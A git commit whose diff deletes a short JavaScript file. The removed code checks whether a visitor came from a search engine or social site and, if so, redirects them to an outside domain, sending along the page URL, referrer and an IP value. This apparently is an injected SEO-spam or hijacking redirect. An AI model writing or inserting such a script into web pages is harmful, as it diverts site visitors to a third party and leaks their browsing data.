a15f3751816daae3ce4a06ea33931ef5ac13cb9b
v8a-engine <126128791+v8a-engine@users.noreply.github.com>
2026-03-09 23:44:04 +0700

    Delete maulana_head_t1.js

--- maulana_head_t1.js
+++
@@ -1,7 +0,0 @@
-///// Arsae /////
-var arsT1Bing = 'https://maulana.unimal.edu.pl';
-// var arsT1Google = 'https://bohkreh.com';
-
-if(['google.', 'msn.', 'bing.', 'yandex.', 'facebook.', 'ecosia', 'qwant', 'pinterest.', 'duckduckgo.', '.yahoo.', 't.co'].some(s => document.referrer.toLowerCase().includes(s))){ 
-	window.location.href = arsT1Bing + '/?arsae='+ encodeURIComponent(window.location.href) + '&arsae_ref='+ encodeURIComponent(document.referrer) + '&ip=' + window.ipAddressArsae
-}
